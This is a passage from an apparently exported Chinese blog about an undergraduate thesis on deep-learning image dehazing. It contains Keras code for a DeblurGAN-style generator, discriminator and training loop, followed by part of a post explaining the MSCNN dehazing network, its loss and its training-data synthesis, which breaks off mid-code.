实现代码参考</h2><h3 id="5-1-构建生成器代码"><a href="#5-1-构建生成器代码" class="headerlink" title="5.1 构建生成器代码"></a>5.1 构建生成器代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator_model</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Build generator architecture.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Current version : ResNet block</span></span><br><span class="line">    inputs = Input(shape=image_shape)</span><br><span class="line"></span><br><span class="line">    x = ReflectionPadding2D((<span class="number">3</span>, <span class="number">3</span>))(inputs)</span><br><span class="line">    x = Conv2D(filters=ngf, kernel_size=(<span class="number">7</span>, <span class="number">7</span>), padding=<span class="string">&#x27;valid&#x27;</span>)(x)</span><br><span class="line">    x = BatchNormalization()(x)</span><br><span class="line">    x = Activation(<span class="string">&#x27;relu&#x27;</span>)(x)</span><br><span class="line"></span><br><span class="line">    n_downsampling = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n_downsampling):</span><br><span class="line">        mult = <span class="number">2</span> ** i</span><br><span class="line">        x = Conv2D(filters=ngf * mult * <span class="number">2</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>)(x)</span><br><span class="line">        x = BatchNormalization()(x)</span><br><span class="line">        x = Activation(<span class="string">&#x27;relu&#x27;</span>)(x)</span><br><span class="line"></span><br><span class="line">    mult = <span class="number">2</span> ** n_downsampling</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n_blocks_gen):</span><br><span class="line">        x = res_block(x, ngf*mult, use_dropout=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n_downsampling):</span><br><span class="line">        mult = <span class="number">2</span> ** (n_downsampling - i)</span><br><span class="line">        x = UpSampling2D()(x)</span><br><span class="line">        x = Conv2D(filters=int(ngf * mult / <span class="number">2</span>), kernel_size=(<span class="number">3</span>, <span class="number">3</span>), padding=<span class="string">&#x27;same&#x27;</span>)(x)</span><br><span class="line">        x = BatchNormalization()(x)</span><br><span class="line">        x = Activation(<span class="string">&#x27;relu&#x27;</span>)(x)</span><br><span class="line"></span><br><span class="line">    x = ReflectionPadding2D((<span class="number">3</span>, <span class="number">3</span>))(x)</span><br><span class="line">    x = Conv2D(filters=output_nc, kernel_size=(<span class="number">7</span>, <span class="number">7</span>), padding=<span class="string">&#x27;valid&#x27;</span>)(x)</span><br><span class="line">    x = Activation(<span class="string">&#x27;tanh&#x27;</span>)(x)</span><br><span class="line"></span><br><span class="line">    outputs = Add()([x, inputs])</span><br><span class="line">    <span class="comment"># outputs = Lambda(lambda z: K.clip(z, -1, 1))(x)</span></span><br><span class="line">    outputs = Lambda(<span class="keyword">lambda</span> z: z / <span class="number">2</span>)(outputs)</span><br><span class="line">    model = Model(inputs=inputs, outputs=outputs, name=<span class="string">&#x27;Generator&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure><h3 id="5-2-构建判别器"><a href="#5-2-构建判别器" class="headerlink" title="5.2 构建判别器"></a>5.2 构建判别器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">discriminator_model</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Build discriminator architecture.&quot;&quot;&quot;</span></span><br><span class="line">    n_layers, use_sigmoid = <span class="number">3</span>, <span class="literal">False</span></span><br><span class="line">    inputs = Input(shape=input_shape_discriminator)</span><br><span class="line"></span><br><span class="line">    x = Conv2D(filters=ndf, kernel_size=(<span class="number">4</span>, <span class="number">4</span>), strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>)(inputs)</span><br><span class="line">    x = LeakyReLU(<span class="number">0.2</span>)(x)</span><br><span class="line"></span><br><span class="line">    nf_mult, nf_mult_prev = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(n_layers):</span><br><span class="line">        nf_mult_prev, nf_mult = nf_mult, min(<span class="number">2</span> ** n, <span class="number">8</span>)</span><br><span class="line">        x = Conv2D(filters=ndf * nf_mult, kernel_size=(<span class="number">4</span>, <span class="number">4</span>), strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>)(x)</span><br><span class="line">        x = BatchNormalization()(x)</span><br><span class="line">        x = LeakyReLU(<span class="number">0.2</span>)(x)</span><br><span class="line"></span><br><span class="line">    nf_mult_prev, nf_mult = nf_mult, min(<span class="number">2</span> ** n_layers, <span class="number">8</span>)</span><br><span class="line">    x = Conv2D(filters=ndf * nf_mult, kernel_size=(<span class="number">4</span>, <span class="number">4</span>), strides=<span class="number">1</span>, padding=<span class="string">&#x27;same&#x27;</span>)(x)</span><br><span class="line">    x = BatchNormalization()(x)</span><br><span class="line">    x = LeakyReLU(<span class="number">0.2</span>)(x)</span><br><span class="line"></span><br><span class="line">    x = Conv2D(filters=<span class="number">1</span>, kernel_size=(<span class="number">4</span>, <span class="number">4</span>), strides=<span class="number">1</span>, padding=<span class="string">&#x27;same&#x27;</span>)(x)</span><br><span class="line">    <span class="keyword">if</span> use_sigmoid:</span><br><span class="line">        x = Activation(<span class="string">&#x27;sigmoid&#x27;</span>)(x)</span><br><span class="line"></span><br><span class="line">    x = Flatten()(x)</span><br><span class="line">    x = Dense(<span class="number">1024</span>, activation=<span class="string">&#x27;tanh&#x27;</span>)(x)</span><br><span class="line">    x = Dense(<span class="number">1</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>,name=<span class="string">&#x27;d-output&#x27;</span>)(x)</span><br><span class="line"></span><br><span class="line">    model = Model(inputs=inputs, outputs=x, name=<span class="string">&#x27;Discriminator&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure><h3 id="5-3-构建整个网络结构"><a href="#5-3-构建整个网络结构" class="headerlink" title="5.3 构建整个网络结构"></a>5.3 构建整个网络结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator_containing_discriminator_multiple_outputs</span>(<span class="params">generator, discriminator</span>):</span></span><br><span class="line">    inputs = Input(shape=image_shape)</span><br><span class="line">    generated_image = generator(inputs)</span><br><span class="line">    outputs = discriminator(generated_image)</span><br><span class="line">    model = Model(inputs=inputs, outputs=[generated_image, outputs])</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure><h3 id="5-4-训练网络"><a href="#5-4-训练网络" class="headerlink" title="5.4 训练网络"></a>5.4 训练网络</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">batch_size, epochs, critic_updates=<span class="number">5</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    训练网络</span></span><br><span class="line"><span class="string">    :param batch_size:</span></span><br><span class="line"><span class="string">    :param epochs:</span></span><br><span class="line"><span class="string">    :param critic_updates: 每个batch_size 中 Discriminator需要训练的次数</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 加载数据</span></span><br><span class="line">    data_loader = DataLoader(batch_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建网络模型</span></span><br><span class="line">    g = generator_model()</span><br><span class="line">    <span class="comment"># g.summary()</span></span><br><span class="line">    d = discriminator_model()</span><br><span class="line">    d.summary()</span><br><span class="line">    d_on_g = generator_containing_discriminator_multiple_outputs(g, d)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存模型结构--用于可视化</span></span><br><span class="line">    g.save(os.path.join(model_save_dir, <span class="string">&quot;generator.h5&quot;</span>))</span><br><span class="line">    d.save(os.path.join(model_save_dir, <span class="string">&quot;discriminator.h5&quot;</span>))</span><br><span class="line">    d_on_g.save(os.path.join(model_save_dir, <span class="string">&quot;d_on_g.h5&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 编译网络模型</span></span><br><span class="line">    d_opt = Adam(lr=<span class="number">1E-4</span>, beta_1=<span class="number">0.9</span>, beta_2=<span class="number">0.999</span>, epsilon=<span class="number">1e-08</span>)</span><br><span class="line">    d_on_g_opt = Adam(lr=<span class="number">1E-4</span>, beta_1=<span class="number">0.9</span>, beta_2=<span class="number">0.999</span>, epsilon=<span class="number">1e-08</span>)</span><br><span class="line"></span><br><span class="line">    d.trainable = <span class="literal">True</span></span><br><span class="line">    d.compile(optimizer=d_opt, loss=wasserstein_loss)</span><br><span class="line">    d.trainable = <span class="literal">False</span></span><br><span class="line">    loss = [perceptual_loss, wasserstein_loss]</span><br><span class="line">    loss_weights = [<span class="number">100</span>, <span class="number">1</span>]</span><br><span class="line">    d_on_g.compile(optimizer=d_on_g_opt, loss=loss, loss_weights=loss_weights)</span><br><span class="line">    d.trainable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置discriminator的real目标和fake目标</span></span><br><span class="line">    output_true_batch, output_false_batch = np.ones((batch_size, <span class="number">1</span>)), -np.ones((batch_size, <span class="number">1</span>))</span><br><span class="line">    <span class="comment"># tensorboard_callback = TensorBoard(log_dir)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> 可以在这里加入恢复权重，接力学习</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练</span></span><br><span class="line">    start = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> tqdm.tqdm(range(epochs)):</span><br><span class="line">        d_losses = []</span><br><span class="line">        d_on_g_losses = []</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(data_loader.file_nums // batch_size):</span><br><span class="line">            img_haze_batch, img_clear_batch = next(data_loader.train_generator)</span><br><span class="line">            <span class="comment"># 放缩到-1 - 1</span></span><br><span class="line">            img_haze_batch = img_haze_batch / <span class="number">127.5</span> - <span class="number">1</span></span><br><span class="line">            img_clear_batch = img_clear_batch / <span class="number">127.5</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            generated_images = g.predict(x=img_haze_batch, batch_size=batch_size)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(critic_updates):</span><br><span class="line">                d_loss_real = d.train_on_batch(img_clear_batch, output_true_batch)</span><br><span class="line">                d_loss_fake = d.train_on_batch(generated_images, output_false_batch)</span><br><span class="line">                d_loss = <span class="number">0.5</span> * np.add(d_loss_fake, d_loss_real)</span><br><span class="line">                d_losses.append(d_loss)</span><br><span class="line"></span><br><span class="line">            d.trainable = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            d_on_g_loss = d_on_g.train_on_batch(img_haze_batch, [img_clear_batch, output_true_batch])</span><br><span class="line">            d_on_g_losses.append(d_on_g_loss)</span><br><span class="line"></span><br><span class="line">            d.trainable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># print log</span></span><br><span class="line">            print(<span class="string">&#x27;d loss %f d_on_g loss %f&#x27;</span> % (d_loss, d_on_g_loss[<span class="number">1</span>] + d_on_g_loss[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> index % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># Test</span></span><br><span class="line">                img_haze_test, img_clear_test = next(data_loader.test_generator)</span><br><span class="line">                generated_images = g.predict(x=img_haze_test / <span class="number">127.5</span> - <span class="number">1</span>, batch_size=batch_size)</span><br><span class="line">                <span class="comment"># 放缩为0-255</span></span><br><span class="line">                generated_images = (generated_images + <span class="number">1</span>) * <span class="number">127.5</span></span><br><span class="line"></span><br><span class="line">                fig, axs = plt.subplots(batch_size, <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">for</span> idx <span class="keyword">in</span> range(batch_size):</span><br><span class="line">                    axs[idx, <span class="number">0</span>].imshow((img_haze_test[idx].astype(<span class="string">&#x27;uint8&#x27;</span>)))</span><br><span class="line">                    axs[idx, <span class="number">0</span>].axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">                    axs[idx, <span class="number">0</span>].set_title(<span class="string">&#x27;haze&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    axs[idx, <span class="number">1</span>].imshow((img_clear_test[idx].astype(<span class="string">&#x27;uint8&#x27;</span>)))</span><br><span class="line">                    axs[idx, <span class="number">1</span>].axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">                    axs[idx, <span class="number">1</span>].set_title(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    axs[idx, <span class="number">2</span>].imshow(generated_images[idx].astype(<span class="string">&#x27;uint8&#x27;</span>))</span><br><span class="line">                    axs[idx, <span class="number">2</span>].axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">                    axs[idx, <span class="number">2</span>].set_title(<span class="string">&#x27;dehazed&#x27;</span>)</span><br><span class="line">                fig.savefig(<span class="string">&quot;./dehazed_result/image/dehazed/%d-%d.jpg&quot;</span> % (epoch, index))</span><br><span class="line"></span><br><span class="line">        now = datetime.datetime.now()</span><br><span class="line">        print(np.mean(d_losses), np.mean(d_on_g_losses), <span class="string">&#x27;spend time %s&#x27;</span> % (now - start))</span><br><span class="line">        <span class="comment"># 保存所有权重</span></span><br><span class="line">        save_all_weights(d, g, epoch, int(np.mean(d_on_g_losses)))</span><br></pre></td></tr></table></figure><p>和MSCNN一样，代码中还有很多需要注意的地方，可自行参考文末的开源链接。</p><h3 id="5-5-参数设置"><a href="#5-5-参数设置" class="headerlink" title="5.5 参数设置"></a>5.5 参数设置</h3><p>不懂这些参数的，可自行参考代码。</p><ul><li>epochs = 50</li><li>batch size = 2</li><li>critic_updates = 4</li><li>Adam 优化器</li></ul><p>在GTX1060 的显卡上跑了8个小时。</p><h2 id="6-实现效果展示"><a href="#6-实现效果展示" class="headerlink" title="6. 实现效果展示"></a>6. 实现效果展示</h2><p><img data-src="https://ae01.alicdn.com/kf/HTB1W27JdoGF3KVjSZFvq6z_nXXaX.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1wuIHdgmH3KVjSZKzq6z2OXXa7.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1UXoQdlCw3KVjSZR0q6zcUpXaO.jpg"></p><p>除此之外，我还做了一个Android App，电脑作为服务器，Android端上传雾图进行去雾，服务处理后回馈，Android显示。视频Demo：</p><iframe id="spkj" src="//player.bilibili.com/player.html?aid=55396421&cid=96861817&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=100%> </iframe>!!!<script type="text/javascript">  document.getElementById("spkj").style.height=document.getElementById("spkj").scrollWidth*0.76+"px";</script>!!!<h2 id="7-结语"><a href="#7-结语" class="headerlink" title="7. 结语"></a>7. 结语</h2><p>虽然是copy的Deblur结构，但是自己实现出来的时候还是非常高兴的。</p><p>所有源代码地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWRlaGF6ZS13b3JrL0RlYmx1ckdhblRvRGVoYXpl" title="https://github.com/raven-dehaze-work/DeblurGanToDehaze">https://github.com/raven-dehaze-work/DeblurGanToDehaze<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像去雾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设总结三-论文复现工作2-MSCNN去雾</title>
      <link href="/archives/15ae521b.html"/>
      <url>/archives/15ae521b.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>毕设总结系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/880ba6e.html">毕设总结零–绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/a513887d.html">毕设总结一–传统去雾理论</a></li><li><a href="https://www.ravenxrz.ink/archives/81fcc536.html">毕设总结二–论文复现工作1–暗通道去雾(DCP)</a></li><li><a href="https://www.ravenxrz.ink/archives/15ae521b.html">毕设总结三–论文复现工作2–MSCNN去雾</a></li><li><a href="https://www.ravenxrz.ink/archives/6631bc9b.html">毕设总结四–最终去雾方案的确定与实现–DeBlurGanToDehaze</a></li><li><a href="https://www.ravenxrz.ink/archives/2caf6b87.html">毕设总结五–杂项</a><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2></li></ul><p>上一篇文章中，我们详细讲解分析了传统去雾方法DCP的原理及实现，本篇文章中，我们再来谈谈近年来火热的“深度学习”以及如何应用深度学习进行去雾。</p><p>本篇中的所有代码均已开源，地址将放于文末。</p><h2 id="2-一点题外话–浅谈深度学习"><a href="#2-一点题外话–浅谈深度学习" class="headerlink" title="2. 一点题外话–浅谈深度学习"></a>2. 一点题外话–浅谈深度学习</h2><p>自2012年ILSVRC竞赛中，基于深度学习的AlexNet已绝对优势获得冠军后，深度学习开始爆热。深度学习几乎成为AI的代名词，现已被运用到如自然语言处理、图像分类、语音识别等等诸多领域。要学习deep learning， 首先要知道什么是深度学习，以及”人工智能“、“机器学习“、”深度学习“的区别。</p><p>引用一篇博文中的定义，深度学习可这样定义：</p><blockquote><p>1.wiki：深度学习是机器学习的分支，它试图使用包含复杂结构或者由多重非线性变换构成的多个处理层对数据进行高层抽象的算法。<br>2.李彦宏：简单的说，深度学习就是一个函数集，如此而已。<br>3.深度学习将特征提取和分类结合到一个框架中，用数据学习特征，是一种可以自动学习特征的方法。<br>4.深度学习是一种特征学习方法，把原始的数据通过非线性的复杂模型转换为更高层次、更抽象的表达。</p></blockquote><p>下图很直观的展示这三者之间的关系。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1fYn8dlKw3KVjSZFOq6yrDVXaL.jpg"></p><p>再来谈谈近年来深度学习中的主角，卷积神经网络(CNN)。它有什么特点呢？一篇经典的文章里是这样描述它的：</p><blockquote><p>Convolutional Neural Networks (<strong>ConvNets</strong> or <strong>CNNs</strong>) are a category of <span class="exturl" data-url="aHR0cHM6Ly91amp3YWxrYXJuLm1lLzIwMTYvMDgvMDkvcXVpY2staW50cm8tbmV1cmFsLW5ldHdvcmtzLw==" title="https://ujjwalkarn.me/2016/08/09/quick-intro-neural-networks/">Neural Networks<i class="fa fa-external-link"></i></span> that have proven very effective in areas such as image recognition and classification. ConvNets have been successful in identifying faces, objects and traffic signs apart from powering vision in robots and self driving cars.</p></blockquote><p>也就是说，它特别<strong>擅长图像识别处理与分类</strong>。</p><p>这里推荐几篇文章学习CNN与了解CNN的进化史：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly91amp3YWxrYXJuLm1lLzIwMTYvMDgvMTEvaW50dWl0aXZlLWV4cGxhbmF0aW9uLWNvbnZuZXRzLw==" title="https://ujjwalkarn.me/2016/08/11/intuitive-explanation-convnets/">An Intuitive Explanation of Convolutional Neural Networks<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3Njcy5yeWVyc29uLmNhL35haGFybGV5L3Zpcy9jb252L2ZsYXQuaHRtbA==" title="http://scs.ryerson.ca/~aharley/vis/conv/flat.html">CNN可视化<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2cxMWQxMTEvYXJ0aWNsZS9kZXRhaWxzLzgyMzUwNTYz" title="https://blog.csdn.net/g11d111/article/details/82350563">CNN概念之上采样，反卷积，Unpooling概念解释 - g11d111的博客 - CSDN博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2NTQzMTE0MzcvP3A9MTk=" title="https://www.bilibili.com/video/av54311437/?p=19">CNN视频教程<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2t5ZnNtL3AvODQ1MTgzNC5odG1s" title="https://www.cnblogs.com/skyfsm/p/8451834.html">CNN网络架构演进：从LeNet到DenseNet - Madcola - 博客园<i class="fa fa-external-link"></i></span></li></ul><hr><h2 id="3-MSCNN去雾"><a href="#3-MSCNN去雾" class="headerlink" title="3.  MSCNN去雾"></a>3.  MSCNN去雾</h2><p>上小节算是一点题外话了，但是这篇的主题是基于深度学习的去雾，那么至少要知道什么是深度学习以及深度学习中最常用的CNN吧。</p><p>MSCNN,全称：《Single Image Dehazing via Multi-scale Convolutional Neural Networks》，由Ren等人于2016年提出。其思想在于<strong>学习雾图与其对应的透射图之间的映射关系，在基于某种算法估计大气光A，最后应用大气散射模型恢复出雾图。</strong>（不懂大气散射模型去雾的可参考本系列总结一）</p><p>个人认为这篇文章有3个核心关注点：</p><ol><li>提出了一种多尺度训练网络，这个网络分为了粗颗粒估计和细颗粒估计两个子网络。</li><li>采用NYU数据集合成出训练网络所有的雾图-透射图训练对。</li><li>利用估计出来的透射图和大气光，利用大气散射模型去雾。</li></ol><h3 id="3-1-MSCNN中的网络结构"><a href="#3-1-MSCNN中的网络结构" class="headerlink" title="3.1  MSCNN中的网络结构"></a>3.1  MSCNN中的网络结构</h3><p>先上一章总图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB10WIwX3FY.1VjSZFqq6ydbXXaP.jpg"></p><p>可以看到上半部为Coarse Net，下半部分为其Fine Net。由Coarse Net估计出Coarse Transmission Map，然后将它级联到Fine Net的第一个Upsample层后，在进行精细提取。简单说一下它的参数设置：</p><p>每一个长方体代表的是特征图，下面的数字代表的是卷积核的个数，下面的文字代表相应的操作和操作的size。</p><p><strong>训练损失函数上</strong>，MSCNN采用了MSE函数,即：</p><p>$$<br>L(t_i(x),t_i^{\delta}(x)) = \frac{1}{q}\sum_{i=1}^{q}||t_i(x)-t_i^{\delta}(x)||^2<br>$$</p><p>其中，q代表的是一个batch size中的雾图个数。</p><p><strong>其余参数：</strong></p><ul><li>采用sgd优化器，动量参数设置为0.9</li><li>batch size 设置为100</li><li>输入图进行归一化处理，统一为320*240</li><li>学习率设置0.01并且每20个epoch衰减0.1</li><li>总epoch设置为70</li></ul><h3 id="3-2-训练数据合成"><a href="#3-2-训练数据合成" class="headerlink" title="3.2 训练数据合成"></a>3.2 训练数据合成</h3><p>作者采用了NYU数据集来构建训练集。NYU数据集提供了清晰图与对应的深度图。合成公式：<br>$$<br>\left\{<br>\begin{array}{l}<br>t(x) = e^{-\beta d(x)}\\<br>I(x) = t(x) J(x) + A(1-t(x))<br>\end{array}<br>\right.<br>$$<br>现在已知d(x)和J(x)，通过随机取$\beta$和$A$，即可得到$t(x)$ 进而 获取$I(x)$雾图。详细的合成方法可参考:</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cT1odHRwczovL2FyeGl2Lm9yZy9wZGYvMTcxMi4wNDE0My5wZGYmc2E9RCZzbnR6PTEmdXNnPUFGUWpDTkh6ZHQza01Ec3Z1SjdFZjZSNGV2NTlPRmVSWUE=" title="https://www.google.com/url?q=https://arxiv.org/pdf/1712.04143.pdf&sa=D&sntz=1&usg=AFQjCNHzdt3kMDsvuJ7Ef6R4ev59OFeRYA">Benchmarking Single Image Dehazing and Beyond<i class="fa fa-external-link"></i></span> </li><li><span class="exturl" data-url="aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3ZpZXcvcmVzaWRlLWRlaGF6ZS1kYXRhc2V0cy9yZXNpZGUtdjA=" title="https://sites.google.com/view/reside-dehaze-datasets/reside-v0">RESIDE<i class="fa fa-external-link"></i></span></li></ul><h3 id="3-3-整个去雾流程"><a href="#3-3-整个去雾流程" class="headerlink" title="3.3 整个去雾流程"></a>3.3 整个去雾流程</h3><p><img data-src="https://ae01.alicdn.com/kf/HTB1LKf7dgmH3KVjSZKzq6z2OXXas.jpg"></p><h2 id="4-搭建MSCNN网络结构参考代码"><a href="#4-搭建MSCNN网络结构参考代码" class="headerlink" title="4. 搭建MSCNN网络结构参考代码"></a>4. 搭建MSCNN网络结构参考代码</h2><p>代码基于Keras结构，不过MSCNN有MATLAB版本和Tensorflow版本，连接都放在了文末。</p><h3 id="4-1-设置超参数和辅助参数"><a href="#4-1-设置超参数和辅助参数" class="headerlink" title="4.1 设置超参数和辅助参数"></a>4.1 设置超参数和辅助参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">self.model_dir_path = <span class="string">&#x27;./model_save&#x27;</span></span><br><span class="line">self.trans_img_dir = <span class="string">&#x27;./dehazed_result/image/trans&#x27;</span></span><br><span class="line">self.trans_npy_dir = <span class="string">&#x27;./dehazed_result/npy/trans&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.model_dir_path):</span><br><span class="line">    os.mkdir(self.model_dir_path)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.trans_img_dir):</span><br><span class="line">    os.mkdir(self.trans_img_dir)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.trans_npy_dir):</span><br><span class="line">    os.mkdir(self.trans_npy_dir)</span><br><span class="line">self.coarse_model_name = <span 